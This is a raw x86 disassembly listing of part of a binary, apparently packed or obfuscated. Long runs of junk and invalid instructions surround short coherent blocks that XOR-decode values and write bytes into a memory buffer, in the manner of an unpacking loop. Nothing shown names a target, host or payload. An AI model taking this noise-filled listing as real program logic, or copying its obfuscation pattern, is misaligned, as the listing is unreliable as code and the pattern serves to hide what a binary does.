  404466:	and    al,0x72
  404468:	jge    0x40440b
  40446a:	fwait
  40446b:	cdq    
  40446c:	daa    
  40446d:	xor    edx,DWORD PTR [edx+0x19eae64b]
  404473:	push   0x46afb90d
  404478:	mov    dl,0x54
  40447a:	cmp    eax,DWORD PTR [esi+0x19]
  40447d:	adc    bh,0x32
  404480:	std    
  404481:	cmp    ah,dh
  404483:	ret    
  404484:	outs   dx,BYTE PTR ds:[esi]
  404485:	pop    ds
  404486:	outs   dx,BYTE PTR ds:[esi]
  404487:	or     al,0x1a
  404489:	add    al,ah
  40448b:	xchg   ebp,eax
  40448c:	popf   
  40448d:	std    
  40448e:	mov    ebx,DWORD PTR [ebp-0x10]
  404491:	jmp    0x4045f6
  404496:	psraw  mm6,0x10
  40449a:	out    0xfb,al
  40449c:	frstor ds:0xaa51ed7e
  4044a2:	imul   edx,DWORD PTR [esi+0x2d],0x7c1f7e50
  4044a9:	jl     0x4044df
  4044ab:	jg     0x404529
  4044ad:	jl     0x4044f2
  4044af:	repnz cli 
  4044b1:	inc    eax
  4044b2:	ja     0x4044d7
  4044b4:	xchg   edi,eax
  4044b5:	xor    DWORD PTR [eax+0x48],0x1e
  4044b9:	call   0xdd85a9cf
  4044be:	imul   esp,ebp,0xffffffd5
  4044c1:	mov    esp,DWORD PTR [edi-0x49]
  4044c4:	sbb    eax,0x7fdb216e
  4044c9:	mov    esp,0xce57e0c7
  4044ce:	xor    eax,0xded7bfdc
  4044d3:	rol    BYTE PTR [ecx+eax*1],0xb2
  4044d7:	push   esi
  4044d8:	iret   
  4044d9:	das    
  4044da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044db:	mov    al,BYTE PTR [edx-0x5c]
  4044de:	ret    
  4044df:	outs   dx,DWORD PTR ds:[esi]
  4044e0:	pop    ecx
  4044e1:	int    0x17
  4044e3:	cdq    
  4044e4:	scas   eax,DWORD PTR es:[edi]
  4044e5:	push   esp
  4044e6:	mov    ebx,0xf3d30571
  4044eb:	repz retf 0xa2be
  4044ef:	or     eax,0x152efc6f
  4044f4:	icebp  
  4044f5:	sub    ebx,DWORD PTR [esi]
  4044f7:	popa   
  4044f8:	or     al,0xa8
  4044fa:	adc    al,0x9e
  4044fc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4044fd:	jge    0x404577
  4044ff:	xchg   ebx,eax
  404500:	add    DWORD PTR [ebp-0x7d],edx
  404503:	(bad)  
  404504:	mov    dl,0xb0
  404506:	outs   dx,BYTE PTR ds:[esi]
  404507:	shr    BYTE PTR [eax+0x6a],cl
  40450a:	mov    ecx,DWORD PTR [edx+edi*8-0xa]
  40450e:	dec    edi
  40450f:	pushf  
  404510:	out    dx,eax
  404511:	sbb    BYTE PTR [edi],dl
  404513:	jecxz  0x4044b7
  404515:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404516:	mov    bl,0xb3
  404518:	(bad)  
  404519:	aam    0x15
  40451b:	add    BYTE PTR [esi],dh
  40451d:	mov    eax,0x37be266
  404522:	and    al,0x98
  404524:	push   esp
  404525:	cs cmp esi,esi
  404528:	outs   dx,BYTE PTR ds:[esi]
  404529:	xchg   ebp,eax
  40452a:	inc    ebp
  40452b:	es js  0x404539
  40452e:	inc    esi
  40452f:	mov    ebp,DWORD PTR [ecx-0x4]
  404532:	repz add ch,dh
  404535:	pop    edx
  404536:	sti    
  404537:	(bad)
  40453b:	cwde   
  40453c:	cmp    bl,BYTE PTR [edx+0x1497e9a4]
  404542:	xchg   edx,eax
  404543:	sti    
  404544:	cli    
  404545:	and    DWORD PTR [ebx-0x2a1b8f3a],0x4e
  40454c:	imul   eax,edx,0x9dcd1b72
  404552:	fcmovnbe st,st(1)
  404554:	enter  0xea76,0x28
  404558:	mov    WORD PTR [esi],ds
  40455a:	jl     0x40452d
  40455c:	out    0x3,eax
  40455e:	outs   dx,DWORD PTR ds:[esi]
  40455f:	ret    0x1714
  404562:	pop    esi
  404563:	adc    al,0x0
  404565:	xor    eax,0xbd199124
  40456a:	jbe    0x404533
  40456c:	sbb    bh,BYTE PTR [esi-0x14]
  40456f:	add    ch,BYTE PTR [edx]
  404571:	adc    ecx,DWORD PTR ds:0xd5f1f901
  404577:	sbb    DWORD PTR [edx+ebx*2+0x1b],edx
  40457b:	adc    eax,0x6de495c7
  404580:	add    dl,bl
  404582:	and    ebx,ebx
  404584:	jmp    FWORD PTR [esi-0x29aafe72]
  40458a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40458b:	add    BYTE PTR [ecx-0x34],cl
  40458e:	pop    edx
  40458f:	mov    esi,DWORD PTR ds:0x5c21e279
  404595:	mov    ebx,0x9662a1cc
  40459a:	sub    DWORD PTR [esi-0x389ed8f9],esp
  4045a0:	cmp    esp,esi
  4045a2:	dec    ebx
  4045a3:	imul   DWORD PTR [esi-0x24]
  4045a6:	inc    esi
  4045a7:	jl     0x40453c
  4045a9:	enter  0x7458,0xf9
  4045ad:	adc    eax,0x839a344c
  4045b2:	adc    al,0x72
  4045b4:	mov    al,ds:0x7f58bb10
  4045b9:	(bad)  
  4045ba:	out    0xbb,al
  4045bc:	in     al,0x6b
  4045be:	(bad)  
  4045c0:	das    
  4045c1:	std    
  4045c2:	jnp    0x4045db
  4045c4:	shl    DWORD PTR [ecx+0x66],cl
  4045c7:	pop    esp
  4045c8:	int    0x62
  4045ca:	xchg   esi,eax
  4045cb:	aam    0xcd
  4045cd:	sti    
  4045ce:	jne    0x40458f
  4045d0:	in     al,dx
  4045d1:	stos   BYTE PTR es:[edi],al
  4045d2:	sbb    al,0x57
  4045d4:	and    BYTE PTR [esi+0x29],0x1d
  4045d8:	sti    
  4045d9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4045da:	and    cl,ch
  4045dc:	jp     0x40463f
  4045de:	pop    esp
  4045df:	call   0x3e82:0x4aba40f8
  4045e6:	add    eax,0x815ed714
  4045eb:	jae    0x40464d
  4045ed:	mov    eax,0xc69d3b71
  4045f2:	das    
  4045f3:	jns    0x4045fe
  4045f5:	cwde   
  4045f6:	sub    ebx,edi
  4045f8:	cmp    ebx,edx
  4045fa:	ja     0x404608
  404600:	mov    edx,DWORD PTR [ebp-0x34]
  404603:	jmp    0x40462f
  404608:	mov    edx,DWORD PTR [ebp-0x3c]
  40460b:	mov    edi,DWORD PTR [ebp-0x4]
  40460e:	xor    edx,eax
  404610:	xor    edi,eax
  404612:	add    edx,ecx
  404614:	add    edi,ecx
  404616:	imul   edx,edi
  404619:	mov    edi,DWORD PTR [ebp-0x8]
  40461c:	mov    ebx,DWORD PTR [ebp-0x10]
  40461f:	sub    ebx,edi
  404621:	cmp    ebx,edx
  404623:	mov    edx,DWORD PTR [ebp-0x38]
  404626:	jbe    0x40462f
  40462c:	mov    edx,DWORD PTR [ebp-0x3c]
  40462f:	mov    edi,DWORD PTR [ebp-0x4]
  404632:	xor    edi,eax
  404634:	xor    edx,eax
  404636:	add    edi,ecx
  404638:	add    edx,ecx
  40463a:	jmp    0x40479f
  40463f:	mov    WORD PTR [ecx+esi*8+0x3f],es
  404643:	dec    ecx
  404644:	(bad)  [esi+0x47]
  404647:	stos   BYTE PTR es:[edi],al
  404648:	call   0x2951:0xc7f6b2d5
  40464f:	ss push ds
  404651:	jl     0x4046cf
  404653:	xor    al,0x7f
  404655:	jl     0x4046d3
  404657:	jae    0x4046b7
  404659:	cmp    BYTE PTR [ebp-0x5f],dl
  40465c:	jae    0x404692
  40465e:	sub    eax,0x995b1b5
  404663:	shr    DWORD PTR [ecx-0x6b],cl
  404666:	rcl    BYTE PTR [esi-0x7f6804ee],1
  40466c:	addr16 out 0x5f,al
  40466f:	das    
  404670:	cwde   
  404671:	fdivr  QWORD PTR [eax+0x6c]
  404674:	sub    dl,BYTE PTR [ebp-0xd]
  404677:	out    dx,al
  404678:	in     al,dx
  404679:	adc    eax,0x9a4b857f
  40467e:	pop    eax
  40467f:	dec    esi
  404680:	inc    ebx
  404681:	jmp    DWORD PTR [ecx]
  404683:	int    0xf7
  404685:	mov    edi,ss
  404687:	inc    edx
  404688:	or     DWORD PTR [esi-0x5f6f49b9],edx
  40468e:	mov    ecx,0x53f1dbc7
  404693:	push   ebx
  404694:	mov    DWORD PTR ss:[edi-0x66],ecx
  404698:	int    0x10
  40469a:	mov    esp,0xa8d53db1
  40469f:	js     0x4046cd
  4046a1:	frstor [edx-0x6b]
  4046a4:	loope  0x4046c7
  4046a6:	and    bl,al
  4046a8:	(bad)  
  4046a9:	xor    eax,0x621a75d0
  4046ae:	dec    ecx
  4046af:	iret   
  4046b0:	pop    esi
  4046b1:	out    0xe0,eax
  4046b3:	pop    es
  4046b4:	add    DWORD PTR [esi-0x29],edx
  4046b7:	fsubr  QWORD PTR [eax-0x7a8ed409]
  4046bd:	addr16 adc eax,0x4c70aec9
  4046c3:	(bad)  
  4046c4:	and    DWORD PTR [eax-0x3b3d62d6],edi
  4046ca:	data16 (bad) [ebp-0x5399265f]
  4046d1:	jge    0x4046a6
  4046d3:	fcom   DWORD PTR [ecx]
  4046d5:	and    ebx,DWORD PTR [edx-0xe5fc425]
  4046db:	inc    edi
  4046dc:	mov    edx,gs
  4046de:	inc    esp
  4046df:	loop   0x4046c1
  4046e1:	add    dl,BYTE PTR [ecx+0x76d84127]
  4046e7:	outs   dx,DWORD PTR ds:[esi]
  4046e8:	pop    es
  4046e9:	mov    ebp,0x4bf4d587
  4046ee:	jmp    0xaf54:0xe1b79d55
  4046f5:	mov    esp,0x44ba0b05
  4046fa:	mov    ecx,0x1faafdf4
  4046ff:	aas    
  404700:	cmp    bl,0x98
  404703:	pop    esi
  404704:	pop    ecx
  404705:	adc    ecx,eax
  404707:	iret   
  404708:	mov    ebp,0xed3582dd
  40470d:	adc    DWORD PTR [ebx+0x66],esi
  404710:	pushf  
  404711:	jle    0x40476e
  404713:	mov    BYTE PTR [ebx],cl
  404715:	fild   WORD PTR [edx+0x1966d7f5]
  40471b:	js     0x40470b
  40471d:	jnp    0x4046cf
  40471f:	xor    edx,DWORD PTR [edx+ecx*8-0x10]
  404723:	xor    DWORD PTR [ecx+0x1c],ebx
  404726:	dec    eax
  404727:	cwde   
  404728:	jp     0x4046df
  40472a:	cmpxchg DWORD PTR [esp+edi*1-0x2a],ebx
  40472f:	xor    ah,BYTE PTR [edi+0x77]
  404732:	hlt    
  404733:	push   ebx
  404734:	add    dh,bh
  404736:	pop    eax
  404737:	fbstp  TBYTE PTR [eax+ecx*1]
  40473a:	faddp  st(6),st
  40473c:	dec    esi
  40473d:	jae    0x404759
  40473f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404740:	and    DWORD PTR [esi+0x2c],esp
  404743:	sbb    al,0x6
  404745:	or     DWORD PTR [edi],edi
  404747:	icebp  
  404748:	cmp    ch,BYTE PTR [ebp-0x26]
  40474b:	adc    BYTE PTR [eax+ebx*4-0x64],bl
  40474f:	loop   0x40479f
  404751:	pop    ss
  404752:	pop    ds
  404753:	outs   dx,DWORD PTR ds:[esi]
  404754:	or     BYTE PTR [ecx],0x43
  404757:	test   DWORD PTR [esi+0x57],eax
  40475a:	jo     0x40478a
  40475c:	shl    ch,1
  40475e:	fwait
  40475f:	add    BYTE PTR ds:[edx+eiz*1-0x7426685],bl
  404767:	sbb    ch,BYTE PTR [ebx-0x8]
  40476a:	inc    ecx
  40476b:	add    eax,0x4bdf4dc
  404770:	lods   eax,DWORD PTR ds:[esi]
  404771:	pusha  
  404772:	push   eax
  404773:	pop    edi
  404774:	fld    TBYTE PTR [edi]
  404776:	cmp    al,0x14
  404778:	push   ds
  404779:	mov    ds:0x9b61639a,al
  40477e:	sbb    al,0x79
  404780:	enter  0xc5ab,0x50
  404784:	cmp    al,0xe1
  404786:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  404787:	or     DWORD PTR [esi],edx
  404789:	js     0x4047a0
  40478b:	mov    BYTE PTR [ebx],cl
  40478d:	jmp    0x23d:0x4bf62876
  404794:	lea    edx,[ecx+0x28]
  404797:	push   ebx
  404798:	mov    esi,0x8139b53f
  40479d:	cwde   
  40479e:	imul   ecx,DWORD PTR [edi],0x5589d7af
  4047a4:	or     al,0x8b
  4047a6:	push   ebp
  4047a7:	or     al,0x89
  4047a9:	push   ebp
  4047aa:	fmul   QWORD PTR [ebx+0x5503f855]
  4047b0:	rol    bh,0x45
  4047b3:	call   0xf8dccced
  4047b8:	mov    DWORD PTR [ebp-0x1c],edx
  4047bb:	mov    DWORD PTR [ebp-0xc],0xf89c8534
  4047c2:	mov    DWORD PTR [ebp-0x44],0xf89c8533
  4047c9:	mov    edx,DWORD PTR [ebp-0x18]
  4047cc:	xor    edx,eax
  4047ce:	add    edx,ecx
  4047d0:	jmp    0x404c6c
  4047d5:	mov    edx,DWORD PTR [ebp-0x18]
  4047d8:	xor    edx,eax
  4047da:	add    edx,DWORD PTR [ebp-0x14]
  4047dd:	mov    edi,DWORD PTR [ebp-0x1c]
  4047e0:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  4047e7:	mov    BYTE PTR [ebp+0xf],dl
  4047ea:	jmp    0x40494f
  4047ef:	int    0xf4
  4047f1:	mov    esi,0xfd66b566
  4047f6:	mov    ebx,0x8fce1da9
  4047fb:	test   al,0x26
  4047fd:	adc    al,0x68
  4047ff:	mov    ss,WORD PTR [ecx]
  404801:	jl     0x40487f
  404803:	xor    al,0x7f
  404805:	jl     0x404883
  404807:	or     BYTE PTR [esi],al
  404809:	cld    
  40480a:	out    0x40,al
  40480c:	dec    ebx
  40480d:	call   0x5a3c8c7
  404812:	stc    
  404813:	cmp    bl,ah
  404815:	fcomp  DWORD PTR ds:0x7bbabcb
  40481b:	call   eax
  40481d:	pop    es
  40481e:	or     ecx,esp
  404820:	dec    ebx
  404821:	pop    ss
  404822:	bound  edx,QWORD PTR [edx-0x5d]
  404825:	int3   
  404826:	in     al,dx
  404827:	test   eax,0xb76472c3
  40482c:	jno    0x404839
  40482e:	and    BYTE PTR [ecx+0x572b25d0],0xbd
  404835:	pop    edi
  404836:	sub    eax,0xd6b229ca
  40483b:	cmp    bh,BYTE PTR [edx]
  40483d:	sub    eax,0x7f1f3737
  404842:	add    DWORD PTR [ebp-0x3f235e07],ebx
  404848:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  40484a:	inc    eax
  40484b:	sub    esp,DWORD PTR [edx]
  40484d:	repnz dec esi
  40484f:	sub    ebx,DWORD PTR [esi-0x34450fae]
  404855:	nop
  404856:	mov    al,0xf9
  404858:	dec    esi
  404859:	(bad)  
  40485a:	dec    ebp
  40485b:	mov    ecx,0xee68a727
  404860:	push   edi
  404861:	push   ecx
  404862:	loopne 0x404847
  404864:	jp     0x404834
  404866:	pop    esi
  404867:	retf   0x77b7
  40486a:	xor    bh,dl
  40486c:	and    edi,DWORD PTR ds:0xaa635814
  404872:	retf   0x2992
  404875:	repz mov bl,0xc
  404878:	icebp  
  404879:	add    al,0x7a
  40487b:	cmp    eax,0xd9582fe7
  404880:	stos   DWORD PTR es:[edi],eax
  404881:	add    bh,BYTE PTR [ebp+esi*8+0x26]
  404885:	ror    BYTE PTR [esi+ebx*4],cl
  404888:	mov    cl,BYTE PTR [eax-0x45]
  40488b:	mov    esp,0xea9fcecb
  404890:	loop   0x4048da
  404892:	lahf   
  404893:	mov    eax,ds:0xe46791d3
  404898:	lods   eax,DWORD PTR ds:[esi]
  404899:	es mov al,0xc9
  40489c:	ja     0x4048a2
  40489e:	inc    edi
  40489f:	mov    edi,0x7068c1af
  4048a4:	pop    ss
  4048a5:	pop    esp
  4048a6:	add    ebp,DWORD PTR [edx+ebx*2+0x29]
  4048aa:	cmc    
  4048ab:	(bad)  
  4048ac:	aas    
  4048ad:	out    0xec,eax
  4048af:	test   eax,0xd64f8552
  4048b4:	lods   eax,DWORD PTR ds:[esi]
  4048b5:	repnz sbb ebp,ebx
  4048b8:	ret    
  4048b9:	fisttp DWORD PTR [eax+eax*8-0x59651dcd]
  4048c0:	in     eax,dx
  4048c1:	push   0x54
  4048c3:	adc    ch,BYTE PTR [ebx+0x17]
  4048c6:	push   es
  4048c7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4048c8:	and    BYTE PTR [ebx+0x2388d03b],0x51
  4048cf:	pop    ds
  4048d0:	jg     0x4048e4
  4048d2:	ficomp WORD PTR [esi+0x71]
  4048d5:	shl    BYTE PTR [edx],cl
  4048d7:	push   ebp
  4048d8:	mov    edx,0xcf43bda
  4048dd:	fnstcw WORD PTR [esi-0x1e35084d]
  4048e3:	ret    
  4048e4:	pop    es
  4048e5:	mov    ebx,0xc3bab978
  4048ea:	dec    ecx
  4048eb:	pop    edx
  4048ec:	dec    ecx
  4048ed:	or     BYTE PTR [ecx*1+0x6a9c3ce],bl
  4048f4:	cmp    al,0xba
  4048f6:	inc    ebp
  4048f7:	adc    eax,0x291a6413
  4048fc:	das    
  4048fd:	(bad)  
  4048fe:	and    al,0xee
  404900:	pop    esi
  404901:	in     eax,dx
  404902:	adc    eax,edi
  404904:	out    dx,al
  404905:	xor    al,BYTE PTR [eax-0x38]
  404908:	addr16 mov esp,0xb2378d50
  40490e:	xor    al,0x38
  404910:	sbb    DWORD PTR [edi-0x166f0d17],eax
  404916:	sbb    ebx,esi
  404918:	inc    ecx
  404919:	sub    ecx,DWORD PTR [ebx-0xb582925]
  40491f:	xor    BYTE PTR [eax],ch
  404921:	fisub  DWORD PTR [edx-0x2]
  404924:	iret   
  404925:	pusha  
  404926:	lods   eax,DWORD PTR ds:[esi]
  404927:	mov    esi,0x9022a00f
  40492c:	and    eax,0x1937668a
  404931:	cwde   
  404932:	mov    ebp,0x6ccec445
  404937:	and    BYTE PTR [edi+ebp*1-0x30a3d45d],bh
  40493e:	out    0x5f,al
  404940:	shr    DWORD PTR [edi+0x62],cl
  404943:	(bad)  
  404945:	inc    ebp
  404946:	aas    
  404947:	sbb    ecx,edi
  404949:	mov    esi,0x1925052c
  40494e:	mov    ebx,0x33f4558b
  404953:	rol    BYTE PTR [ebx],1
  404955:	push   ebp
  404956:	in     al,dx
  404957:	mov    edi,DWORD PTR [ebp-0x1c]
  40495a:	mov    dl,BYTE PTR [edx+edi*1+0x32729e]
  404961:	mov    BYTE PTR [ebp+0xb],dl
  404964:	mov    dl,BYTE PTR [ebp+0xf]
  404967:	mov    edi,DWORD PTR [ebp-0xc]
  40496a:	xor    edi,eax
  40496c:	add    edi,DWORD PTR [ebp-0x14]
  40496f:	mov    ebx,DWORD PTR [ebp-0x1c]
  404972:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404979:	jmp    0x404ade
  40497e:	adc    ebx,DWORD PTR cs:[ecx]
  404981:	iret   
  404982:	sbb    eax,0xb1d5e6fd
  404987:	and    edi,DWORD PTR ss:[ebx-0x6439fd0f]
  40498e:	inc    esi
  40498f:	adc    BYTE PTR [esp+edi*2+0x34],bh
  404993:	jg     0x404a11
  404995:	jl     0x4049a2
  404997:	push   edx
  404998:	mov    ah,0xc1
  40499a:	rol    BYTE PTR [ecx],cl
  40499c:	xchg   edi,eax
  40499d:	add    DWORD PTR [ebx],ecx
  40499f:	xchg   esi,eax
  4049a0:	cmc    
  4049a1:	push   ebx
  4049a2:	icebp  
  4049a3:	push   ecx
  4049a4:	stos   DWORD PTR es:[edi],eax
  4049a5:	jns    0x4049b0
  4049a7:	sub    BYTE PTR [ecx+0x15bfbe1],ah
  4049ad:	pop    edx
  4049ae:	and    DWORD PTR [ecx-0x2a3c56c8],esi
  4049b4:	imul   esp,DWORD PTR [edi+0x6f55a35d],0x20
  4049bb:	push   edi
  4049bc:	cmp    eax,0x8714108b
  4049c1:	pop    ds
  4049c2:	ror    BYTE PTR [ecx+ecx*1-0x941be69],1
  4049c9:	sbb    eax,0x53e7b2ba
  4049ce:	mov    eax,edx
  4049d0:	test   DWORD PTR [ecx-0x76],esi
  4049d3:	inc    esi
  4049d4:	gs or  al,0xda
  4049d7:	cmp    ebx,DWORD PTR [edx-0xb]
  4049da:	xor    esi,ecx
  4049dc:	add    eax,0x4c1ac434
  4049e1:	adc    BYTE PTR [eax-0x4602fef4],al
  4049e7:	mov    WORD PTR [ebp+0x35],?
  4049ea:	or     BYTE PTR [edx],bh
  4049ec:	mov    dh,BYTE PTR [ecx-0x25]
  4049ef:	int3   
  4049f0:	ins    DWORD PTR es:[edi],dx
  4049f1:	lock cmp al,0x1f
  4049f4:	push   0x39d085ec
  4049f9:	imul   edi,DWORD PTR [edi],0xffffffa4
  4049fc:	mov    edi,0xd60119c
  404a01:	push   ebp
  404a02:	sar    DWORD PTR [edi+ecx*8+0x8],0xb8
  404a07:	in     al,0xb9
  404a09:	add    eax,0x4dfd6c99
  404a0e:	jno    0x4049bb
  404a10:	add    al,0x3c
  404a12:	dec    ebp
  404a13:	add    al,0xf0
  404a15:	ret    
  404a16:	hlt    
  404a17:	(bad)  
  404a18:	inc    DWORD PTR [ebx+0x5653cde]
  404a1e:	imul   ebp,DWORD PTR [edi-0x2ce7550e],0x4b
  404a25:	ss lahf 
  404a27:	sbb    BYTE PTR [ebx+0x1e],bh
  404a2a:	cld    
  404a2b:	pusha  
  404a2c:	dec    edi
  404a2d:	xor    eax,0x628413cf
  404a32:	fcomp  DWORD PTR [edi-0x44]
  404a35:	mov    edx,0x2d3e9ba8
  404a3a:	imul   ecx,ebp,0x12
  404a3d:	scas   eax,DWORD PTR es:[edi]
  404a3e:	xchg   esi,eax
  404a3f:	inc    esp
  404a40:	push   esp
  404a41:	inc    ecx
  404a42:	and    eax,0xf51c401a
  404a47:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  404a48:	jns    0x404a0b
  404a4a:	cmp    BYTE PTR [eax-0x3bdd97b6],al
  404a50:	lock xchg edi,eax
  404a52:	stc    
  404a53:	and    al,bh
  404a55:	inc    esp
  404a56:	dec    esp
  404a57:	xor    BYTE PTR [ecx],ch
  404a59:	pop    ebx
  404a5a:	xchg   esp,eax
  404a5b:	sti    
  404a5c:	push   ecx
  404a5d:	sbb    eax,0x1c89b48b
  404a62:	sbb    ah,ah
  404a64:	(bad)  
  404a65:	sbb    DWORD PTR fs:[ebx+eiz*4+0x256b488e],esi
  404a6d:	jmp    0x82002771
  404a72:	ins    BYTE PTR es:[edi],dx
  404a73:	into   
  404a74:	push   edi
  404a75:	xchg   edx,eax
  404a76:	ins    DWORD PTR es:[edi],dx
  404a77:	ds sub al,0x81
  404a7a:	jmp    0x404ac5
  404a7c:	repnz xchg esi,eax
  404a7e:	mov    cl,0xed
  404a80:	sbb    eax,0xddeb2ad
  404a85:	jbe    0x404ab8
  404a87:	jmp    0x404a4e
  404a89:	fsub   DWORD PTR [esi]
  404a8b:	adc    BYTE PTR [eax-0x69],dl
  404a8e:	ret    0xf1c0
  404a91:	push   esi
  404a92:	mov    ?,WORD PTR [edi-0x2ed8ae9b]
  404a98:	cli    
  404a99:	xchg   edx,eax
  404a9a:	dec    esp
  404a9b:	mov    ah,0x36
  404a9d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  404a9e:	or     eax,0x603de238
  404aa3:	dec    BYTE PTR [eax+0x104f2d90]
  404aa9:	call   0xa3f9:0x579529d5
  404ab0:	mov    ecx,0x9871fd4d
  404ab5:	popf   
  404ab6:	sbb    eax,0x6616d9a7
  404abb:	pop    ds
  404abc:	mov    ds:0x7d468346,al
  404ac1:	sbb    al,0xdd
  404ac3:	mov    eax,0xd948d2be
  404ac8:	lahf   
  404ac9:	jmp    0xc6ae:0x7c4a3e8b
  404ad0:	xchg   esp,eax
  404ad1:	cmp    eax,0xd701b3b
  404ad6:	imul   ecx,DWORD PTR [ecx+0x71582d3],0x558ac52c
  404ae0:	or     ecx,DWORD PTR [ebx-0x7cc1783]
  404ae6:	add    edi,DWORD PTR [ebp-0x14]
  404ae9:	mov    ebx,DWORD PTR [ebp-0x1c]
  404aec:	mov    BYTE PTR [edi+ebx*1+0x32729e],dl
  404af3:	mov    edx,DWORD PTR [ebp-0x44]
  404af6:	mov    edi,DWORD PTR [ebp-0xc]
  404af9:	xor    edx,eax
  404afb:	xor    edi,eax
  404afd:	add    edx,ecx
  404aff:	add    edi,ecx
  404b01:	imul   edx,edi
  404b04:	add    edx,DWORD PTR [ebp-0x14]
  404b07:	jmp    0x404c6c
  404b0c:	stos   DWORD PTR es:[edi],eax
  404b0d:	outs   dx,BYTE PTR ds:[esi]
  404b0e:	cmp    al,0x3d
  404b10:	fnstsw WORD PTR [ebp+0x313d6e7d]
  404b16:	lods   eax,DWORD PTR ds:[esi]
  404b17:	sbb    eax,0x3d77ddf1
  404b1c:	push   ds
  404b1d:	adc    bh,BYTE PTR [esp+edi*2+0x34]
  404b21:	jg     0x404b9f
  404b23:	jl     0x404b44
  404b25:	xchg   DWORD PTR [esi],ebx
  404b27:	fwait
  404b28:	mov    al,BYTE PTR [ecx+0x75d7c4fb]
  404b2e:	popf   
  404b2f:	retf   0xfc66
  404b32:	and    eax,0xc5ba10f4
  404b37:	mov    ebx,0x82d468ff
  404b3c:	loope  0x404b1c
  404b3e:	int    0x9f
  404b40:	xchg   ecx,eax
  404b41:	jmp    0xdd808807
  404b46:	div    BYTE PTR [eax+edx*1-0x6d2d54f9]
  404b4d:	push   edx
  404b4e:	push   cs
  404b4f:	sub    esp,DWORD PTR [esi-0x578d3629]
  404b55:	scas   al,BYTE PTR es:[edi]
  404b56:	cs sub eax,0xbc008dcc
  404b5c:	or     eax,0x489bfcaa
  404b61:	inc    BYTE PTR [eax]
  404b63:	out    0xe,eax
  404b65:	mov    al,ds:0x1f4d7e25
  404b6a:	pop    esp
  404b6b:	jp     0x404b76
  404b6d:	dec    ecx
  404b6e:	jo     0x404b19
  404b70:	jo     0x404b41
  404b72:	imul   ecx,DWORD PTR [ecx+0x55d1752f],0xffffffda
  404b79:	push   esi
  404b7a:	mov    bh,0x2e
  404b7c:	xor    DWORD PTR [eax+0x6026e182],ebp
  404b82:	repz popa 
  404b84:	js     0x404b4c
  404b86:	mov    ebx,0xb59c986a
  404b8b:	jle    0x404bfa
  404b8d:	and    al,0x2d
  404b8f:	mov    ch,0xa
  404b91:	cwde   
  404b92:	push   eax
  404b93:	xchg   dl,bl
  404b95:	or     DWORD PTR [eax-0x5dfb602f],ebx
  404b9b:	inc    ebp
  404b9c:	repz pop ebp
  404b9e:	or     esi,DWORD PTR [edi+0x77]
  404ba1:	retf   
  404ba2:	adc    al,0xa3
  404ba4:	out    dx,eax
  404ba5:	outs   dx,BYTE PTR ds:[esi]
  404ba6:	ins    DWORD PTR es:[edi],dx
  404ba7:	jno    0x404b47
  404ba9:	lods   al,BYTE PTR ds:[esi]
  404baa:	cmp    eax,0xdd6e4a18
  404baf:	(bad)  
  404bb0:	mov    edx,0x9a0c766a
  404bb5:	stos   BYTE PTR es:[edi],al
  404bb6:	mov    ah,0xdb
  404bb8:	adc    al,0x13
  404bba:	mov    ch,0xf0
  404bbc:	out    0x80,al
  404bbe:	xchg   DWORD PTR [edi+0x35ea661d],esi
  404bc4:	sbb    eax,0x1b0c4f02
  404bc9:	cmp    bh,BYTE PTR [esi]
  404bcb:	push   ebx
  404bcc:	dec    esp
  404bcd:	sbb    DWORD PTR [esp+ebp*4-0x6b8413ee],0x94e6b0b5
  404bd8:	or     al,0x9e
  404bda:	lock push 0x6d
  404bdd:	retf   
  404bde:	push   ds
  404bdf:	add    BYTE PTR [edi-0x7b],al
  404be2:	push   ecx
  404be3:	loop   0x404bf3
  404be5:	ins    DWORD PTR es:[edi],dx
  404be6:	cmp    ch,BYTE PTR [esi-0x14332f7b]
  404bec:	(bad)  
  404bee:	in     al,0x70
  404bf0:	adc    BYTE PTR [esi-0x2d],ah
  404bf3:	or     BYTE PTR [esi-0x31eff605],0x99
  404bfa:	add    eax,0xbdc51b53
  404bff:	xchg   ebp,eax
  404c00:	push   ecx
  404c01:	sub    DWORD PTR [eax],ebp
  404c03:	fsub   DWORD PTR [ebx-0x77]
  404c06:	add    esi,esp
  404c08:	nop
  404c09:	loopne 0x404c45
  404c0b:	fidivr DWORD PTR [esi]
  404c0d:	outs   dx,DWORD PTR ds:[esi]
  404c0e:	add    eax,0x39274c96
  404c13:	pushf  
  404c14:	push   eax
  404c15:	retf   0x223e
  404c18:	cld    
  404c19:	shl    BYTE PTR [edi-0x552d5aea],0x93
  404c20:	cmp    DWORD PTR [edi],esp
  404c22:	mov    dh,0x37
  404c24:	xlat   BYTE PTR ds:[ebx]
  404c25:	test   BYTE PTR [ecx],0x35
  404c28:	fisttp QWORD PTR [ebp-0x26ad7129]
  404c2e:	in     al,dx
  404c2f:	push   ss
  404c30:	js     0x404cae
  404c32:	push   ds
  404c33:	pop    ecx
  404c34:	push   edi
  404c35:	mov    ecx,0xbff62d36
  404c3a:	sbb    al,0x4c
  404c3c:	xor    eax,0x10312217
  404c41:	cmp    DWORD PTR [edi],ebx
  404c43:	pop    es
  404c44:	inc    edx
  404c45:	rol    BYTE PTR [edi],cl
  404c47:	sahf   
  404c48:	fild   WORD PTR [ebp-0x7542b4ab]
  404c4e:	idiv   DWORD PTR [edi]
  404c50:	cmp    al,0x6
  404c52:	dec    esp
  404c53:	and    edi,DWORD PTR [ecx]
  404c55:	jle    0x404c59
  404c57:	add    dx,dx
  404c5a:	je     0x404c64
  404c5c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c5d:	dec    eax
  404c5e:	or     BYTE PTR [ebp+eax*1-0x26],0xaf
  404c63:	mov    al,0x5e
  404c65:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  404c66:	(bad)  
  404c68:	hlt    
